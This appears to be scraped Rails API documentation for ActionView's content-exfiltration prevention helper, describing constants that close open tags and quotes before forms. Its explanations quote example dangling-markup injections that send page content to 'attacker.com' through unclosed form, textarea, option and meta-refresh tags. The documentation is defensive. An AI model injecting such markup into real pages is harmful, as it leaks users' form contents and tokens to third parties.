MethodsPprevent_content_exfiltrationConstantsCLOSE_CDATA_COMMENT="<!-- </textarea></xmp> -->".html_safe.freezeClose any open tags that support CDATA (textarea, xmp) before each form tag. This prevents attackers from injecting unclosed tags that could capture form contents.For example, an attacker might inject:<form action="https://attacker.com"><textarea>The HTML following this tag, up until the next</textarea>or the end of the document would be captured by the attackerâs<textarea>. By closing any open textarea tags, we ensure that form contents are never exfiltrated.CLOSE_FORM_TAG="</form>".html_safe.freezeClose any open form tags before each new form tag. This prevents attackers from injecting unclosed forms that could leak markup offsite.For example, an attacker might inject:<form action="https://attacker.com">The form elements following this tag, up until the next</form>would be captured by the attackerâs<form>. By closing any open form tags, we ensure that form contents are never exfiltrated.CLOSE_OPTION_TAG="</option>".html_safe.freezeClose any open option tags before each form tag. This prevents attackers from injecting unclosed options that could leak markup offsite.For example, an attacker might inject:<form action="https://attacker.com"><option>The HTML following this tag, up until the next</option>or the end of the document would be captured by the attackerâs<option>. By closing any open option tags, we ensure that form contents are never exfiltrated.CLOSE_QUOTES_COMMENT=%q(<!-- '"` -->).html_safe.freezeClose any open attributes before each form tag. This prevents attackers from injecting partial tags that could leak markup offsite.For example, an attacker might inject:<meta http-equiv="refresh" content='0;URL=https://attacker.com?The HTML following this tag, up until the next single quote would be sent tohttps://attacker.com. By closing any open attributes, we ensure that form contents are never exfiltrated this way.CONTENT_EXFILTRATION_PREVENTION_MARKUP=(CLOSE_QUOTES_COMMENT + CLOSE_CDATA_COMMENT + CLOSE_OPTION_TAG + CLOSE_FORM_TAG).freezeInstance Public methodsprevent_content_exfiltration(html)LinkSource:show|on GitHub# File actionview/lib/action_view/helpers/content_exfiltration_prevention_helper.rb, line 61defprevent_content_exfiltration(html)ifprepend_content_exfiltration_preventionCONTENT_EXFILTRATION_PREVENTION_MARKUP+htmlelsehtmlendend